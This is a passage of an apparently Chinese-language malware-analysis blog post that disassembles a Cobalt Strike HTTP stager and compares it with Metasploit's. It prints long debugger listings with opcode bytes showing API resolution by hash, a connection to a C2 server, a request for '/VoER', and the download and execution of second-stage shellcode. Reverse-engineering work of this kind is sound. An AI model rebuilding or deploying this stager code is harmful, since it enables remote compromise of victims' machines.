class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"> <span class="number">00</span>D440E2                                         <span class="operator">|</span> <span class="number">5</span>A                          <span class="operator">|</span> pop edx                                         <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440E3                                         <span class="operator">|</span> <span class="number">8</span>B12                        <span class="operator">|</span> mov edx,dword ptr ds:[edx]                      <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440E5                                         <span class="operator">|</span> EB <span class="number">86</span>                       <span class="operator">|</span> jmp cs_shellcode.D4406D</span><br></pre></td></tr></table></figure>

<p>初始化和第一部分代码对比MSF一个都没变，第二部分开始有所不同，但其实思路是一样的，只是调用的API不同了</p>
<p>首先调用代码Loadlibrary（”wininet.dll”），对应汇编，不同的是MSF调用的是LoadLibraryA(“ws2_32.dll”)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>D440E7                                         <span class="operator">|</span> <span class="number">5</span>D                          <span class="operator">|</span> pop ebp                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440E8                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">6E657400</span>                 <span class="operator">|</span> push <span class="number">74656</span>E                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440ED                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">77696E69</span>                 <span class="operator">|</span> push <span class="number">696E6977</span>                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440F2 <span class="operator">&lt;</span>cs_shellcode.<span class="operator">&amp;</span>RtlSleepConditionVariabl <span class="operator">|</span> <span class="number">54</span>                          <span class="operator">|</span> push esp                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440F3                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">4</span>C772607                 <span class="operator">|</span> push <span class="number">726774</span>C                                    <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440F8                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                               <span class="operator">|</span></span><br></pre></td></tr></table></figure>

<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180335-mqp2vau.png">​</p>
<p>关于winint.dll,这将会导致后续调用的API产生不同</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180335-fh4wcdc.png">​</p>
<p>然后调用wininet.internetOpenA,参数全为空</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180335-p84gbxv.png">​</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HINTERNET hInternet <span class="operator">=</span> InternetOpenA(&quot;MyApp&quot;,                      <span class="operator">/</span><span class="operator">/</span> 应用程序名称</span><br><span class="line">INTERNET_OPEN_TYPE_PRECONFIG, <span class="operator">/</span><span class="operator">/</span> 使用系统配置的代理<span class="keyword">NULL</span>,                         <span class="operator">/</span><span class="operator">/</span> 不使用特定代理<span class="keyword">NULL</span>,                         <span class="operator">/</span><span class="operator">/</span> 不绕过任何地址<span class="number">0</span>                             <span class="operator">/</span><span class="operator">/</span> 无特殊标志);</span><br></pre></td></tr></table></figure>

<p>对应的汇编代码如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>D440FC                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440FD                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440FE                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440FF                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44100                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44101                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">3</span>A5679A7                 <span class="operator">|</span> push A779563A</span><br></pre></td></tr></table></figure>

<p>调用wininet.InternetConnetA，连接C2端</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-jelfo4e.png">​</p>
<p>这里有一个反复跳转的混淆提一下，后续这个混淆会出现多次</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-6u3eqga.png">​</p>
<p>调用wininet.HttpOpenRequestA，打开http请求，准备请求资源&#x2F;VoER</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-vjsojlz.png">​</p>
<p>调用wininet.HttpSendRequestA，请求头如下</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-wspe9px.png">​</p>
<h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p>经过两层判断，第一个test eax,eax判断eax是不是0，是0就跳转到exitprocess</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>D44150                                         <span class="operator">|</span> <span class="number">85</span>C0                        <span class="operator">|</span> test eax,eax                                    <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44152                                         <span class="operator">|</span> <span class="number">0</span>F84 C3010000               <span class="operator">|</span> je cs_shellcode.D4431B                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44158                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D4415A                                         <span class="operator">|</span> <span class="number">85</span>F6                        <span class="operator">|</span> test esi,esi                                    <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\Users\At\Desktop\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D4415C                                         <span class="operator">|</span> <span class="number">74</span> <span class="number">04</span>                       <span class="operator">|</span> je cs_shellcode.D44162                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4415E                                         <span class="operator">|</span> <span class="number">89</span>F9                        <span class="operator">|</span> mov ecx,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44160                                         <span class="operator">|</span> EB <span class="number">09</span>                       <span class="operator">|</span> jmp cs_shellcode.D4416B                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44162                                         <span class="operator">|</span> <span class="number">68</span> AAC5E25D                 <span class="operator">|</span> push <span class="number">5</span>DE2C5AA                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44167                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp</span><br></pre></td></tr></table></figure>

<h2 id="连接成功分支"><a href="#连接成功分支" class="headerlink" title="连接成功分支"></a>连接成功分支</h2><p>调用user32.GetDesktopWindow</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-r9n4jhf.png">​</p>
<p>调用wininet.InternetErrorDlg</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-y3rb886.png">​</p>
<p>调用kernel32.VitualAlloc</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180337-eu1zvji.png">​</p>
<p>调用wininet.InternetReadFile读取shellcode</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180337-479d0xh.png">​</p>
<p>最终跳转到shellcode执行</p>
<p>值得注意的是即便没有开CS的服务，也会走这个分支，最后会因为shellcode为空而引发异常</p>
<h2 id="连接失败分支"><a href="#连接失败分支" class="headerlink" title="连接失败分支"></a>连接失败分支</h2><p>直接跳转到退出函数kernel32.ExitProcess</p>
<p>​<img src="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180337-i2cizhh.png">​</p>
<h2 id="汇编代码汇总"><a href="#汇编代码汇总" class="headerlink" title="汇编代码汇总"></a>汇编代码汇总</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line">初始化与环境设置，并调用D440E7函数</span><br><span class="line"><span class="number">00</span>D44058 <span class="operator">&lt;</span>cs_shellcode.unsigned <span class="type">char</span> <span class="operator">*</span>buf<span class="operator">&gt;</span>       <span class="operator">|</span> FC                          <span class="operator">|</span> cld                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44059                                         <span class="operator">|</span> E8 <span class="number">89000000</span>                 <span class="operator">|</span> <span class="keyword">call</span> cs_shellcode.D440E7                        <span class="operator">|</span></span><br><span class="line"></span><br><span class="line">函数D4405E</span><br><span class="line"><span class="number">00</span>D4405E                                         <span class="operator">|</span> <span class="number">60</span>                          <span class="operator">|</span> pushad                                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4405F                                         <span class="operator">|</span> <span class="number">89E5</span>                        <span class="operator">|</span> mov ebp,esp                                     <span class="operator">|</span></span><br><span class="line">获取PEB，通过PEB获取模块地址和模块名称</span><br><span class="line"><span class="number">00</span>D44061                                         <span class="operator">|</span> <span class="number">31</span>D2                        <span class="operator">|</span> xor edx,edx                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44063                                         <span class="operator">|</span> <span class="number">64</span>:<span class="number">8</span>B52 <span class="number">30</span>                  <span class="operator">|</span> mov edx,dword ptr fs:[edx<span class="operator">+</span><span class="number">30</span>]                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44067                                         <span class="operator">|</span> <span class="number">8</span>B52 <span class="number">0</span>C                     <span class="operator">|</span> mov edx,dword ptr ds:[edx<span class="operator">+</span>C]                    <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4406A                                         <span class="operator">|</span> <span class="number">8</span>B52 <span class="number">14</span>                     <span class="operator">|</span> mov edx,dword ptr ds:[edx<span class="operator">+</span><span class="number">14</span>]                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4406D                                         <span class="operator">|</span> <span class="number">8</span>B72 <span class="number">28</span>                     <span class="operator">|</span> mov esi,dword ptr ds:[edx<span class="operator">+</span><span class="number">28</span>]                   <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D44070                                         <span class="operator">|</span> <span class="number">0</span>FB74A <span class="number">26</span>                   <span class="operator">|</span> movzx ecx,word ptr ds:[edx<span class="operator">+</span><span class="number">26</span>]                  <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44074                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line">处理模块名称，如果是小写就转为大写</span><br><span class="line"><span class="number">00</span>D44076                                         <span class="operator">|</span> <span class="number">31</span>C0                        <span class="operator">|</span> xor eax,eax                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44078                                         <span class="operator">|</span> AC                          <span class="operator">|</span> lodsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44079                                         <span class="operator">|</span> <span class="number">3</span>C <span class="number">61</span>                       <span class="operator">|</span> cmp al,<span class="number">61</span>                                       <span class="operator">|</span> <span class="number">61</span>:<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="number">00</span>D4407B                                         <span class="operator">|</span> <span class="number">7</span>C <span class="number">02</span>                       <span class="operator">|</span> jl cs_shellcode.D4407F                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4407D                                         <span class="operator">|</span> <span class="number">2</span>C <span class="number">20</span>                       <span class="operator">|</span> sub al,<span class="number">20</span>                                       <span class="operator">|</span></span><br><span class="line">计算上面模块名称的hash值，计算算为每个字节右旋<span class="number">13</span>相加，而不像之前所了解到的sha1那么复杂</span><br><span class="line"><span class="number">00</span>D4407F                                         <span class="operator">|</span> C1CF <span class="number">0</span>D                     <span class="operator">|</span> ror edi,D                                       <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44082                                         <span class="operator">|</span> <span class="number">01</span>C7                        <span class="operator">|</span> <span class="keyword">add</span> edi,eax                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;, eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44084                                         <span class="operator">|</span> E2 F0                       <span class="operator">|</span> loop cs_shellcode.D44076                        <span class="operator">|</span></span><br><span class="line">通过模块地址获取模块中的导出表中的函数，下面的edx为模块所在地址，edi为模块名称的hash值</span><br><span class="line"><span class="number">00</span>D44086                                         <span class="operator">|</span> <span class="number">52</span>                          <span class="operator">|</span> push edx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44087                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44088                                         <span class="operator">|</span> <span class="number">8</span>B52 <span class="number">10</span>                     <span class="operator">|</span> mov edx,dword ptr ds:[edx<span class="operator">+</span><span class="number">10</span>]                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4408B                                         <span class="operator">|</span> <span class="number">8</span>B42 <span class="number">3</span>C                     <span class="operator">|</span> mov eax,dword ptr ds:[edx<span class="operator">+</span><span class="number">3</span>C]                   <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4408E                                         <span class="operator">|</span> <span class="number">01</span>D0                        <span class="operator">|</span> <span class="keyword">add</span> eax,edx                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44090                                         <span class="operator">|</span> <span class="number">8</span>B40 <span class="number">78</span>                     <span class="operator">|</span> mov eax,dword ptr ds:[eax<span class="operator">+</span><span class="number">78</span>]                   <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf, dword ptr ds:[eax<span class="operator">+</span><span class="number">78</span>]:buf<span class="operator">+</span><span class="number">78</span></span><br><span class="line"><span class="number">00</span>D44093                                         <span class="operator">|</span> <span class="number">85</span>C0                        <span class="operator">|</span> test eax,eax                                    <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44095                                         <span class="operator">|</span> <span class="number">74</span> <span class="number">4</span>A                       <span class="operator">|</span> je cs_shellcode.D440E1                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44097                                         <span class="operator">|</span> <span class="number">01</span>D0                        <span class="operator">|</span> <span class="keyword">add</span> eax,edx                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44099                                         <span class="operator">|</span> <span class="number">50</span>                          <span class="operator">|</span> push eax                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4409A                                         <span class="operator">|</span> <span class="number">8</span>B48 <span class="number">18</span>                     <span class="operator">|</span> mov ecx,dword ptr ds:[eax<span class="operator">+</span><span class="number">18</span>]                   <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span><span class="number">18</span>]:buf<span class="operator">+</span><span class="number">18</span></span><br><span class="line"><span class="number">00</span>D4409D                                         <span class="operator">|</span> <span class="number">8</span>B58 <span class="number">20</span>                     <span class="operator">|</span> mov ebx,dword ptr ds:[eax<span class="operator">+</span><span class="number">20</span>]                   <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span><span class="number">20</span>]:buf<span class="operator">+</span><span class="number">20</span></span><br><span class="line"><span class="number">00</span>D440A0                                         <span class="operator">|</span> <span class="number">01</span>D3                        <span class="operator">|</span> <span class="keyword">add</span> ebx,edx                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440A2                                         <span class="operator">|</span> E3 <span class="number">3</span>C                       <span class="operator">|</span> jecxz cs_shellcode.D440E0                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440A4                                         <span class="operator">|</span> <span class="number">49</span>                          <span class="operator">|</span> <span class="type">dec</span> ecx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440A5                                         <span class="operator">|</span> <span class="number">8</span>B348B                      <span class="operator">|</span> mov esi,dword ptr ds:[ebx<span class="operator">+</span>ecx<span class="operator">*</span><span class="number">4</span>]                <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D440A8                                         <span class="operator">|</span> <span class="number">01</span>D6                        <span class="operator">|</span> <span class="keyword">add</span> esi,edx                                     <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D440AA                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440AC                                         <span class="operator">|</span> <span class="number">31</span>C0                        <span class="operator">|</span> xor eax,eax                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D440AE                                         <span class="operator">|</span> AC                          <span class="operator">|</span> lodsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440AF                                         <span class="operator">|</span> C1CF <span class="number">0</span>D                     <span class="operator">|</span> ror edi,D                                       <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440B2                                         <span class="operator">|</span> <span class="number">01</span>C7                        <span class="operator">|</span> <span class="keyword">add</span> edi,eax                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;, eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D440B4                                         <span class="operator">|</span> <span class="number">38E0</span>                        <span class="operator">|</span> cmp al,ah                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440B6                                         <span class="operator">|</span> <span class="number">75</span> F4                       <span class="operator">|</span> jne cs_shellcode.D440AC                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440B8                                         <span class="operator">|</span> <span class="number">037</span>D F8                     <span class="operator">|</span> <span class="keyword">add</span> edi,dword ptr ss:[ebp<span class="number">-8</span>]                    <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440BB                                         <span class="operator">|</span> <span class="number">3</span>B7D <span class="number">24</span>                     <span class="operator">|</span> cmp edi,dword ptr ss:[ebp<span class="operator">+</span><span class="number">24</span>]                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440BE                                         <span class="operator">|</span> <span class="number">75</span> E2                       <span class="operator">|</span> jne cs_shellcode.D440A2                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440C0                                         <span class="operator">|</span> <span class="number">58</span>                          <span class="operator">|</span> pop eax                                         <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D440C1                                         <span class="operator">|</span> <span class="number">8</span>B58 <span class="number">24</span>                     <span class="operator">|</span> mov ebx,dword ptr ds:[eax<span class="operator">+</span><span class="number">24</span>]                   <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span><span class="number">24</span>]:buf<span class="operator">+</span><span class="number">24</span></span><br><span class="line"><span class="number">00</span>D440C4                                         <span class="operator">|</span> <span class="number">01</span>D3                        <span class="operator">|</span> <span class="keyword">add</span> ebx,edx                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440C6                                         <span class="operator">|</span> <span class="number">66</span>:<span 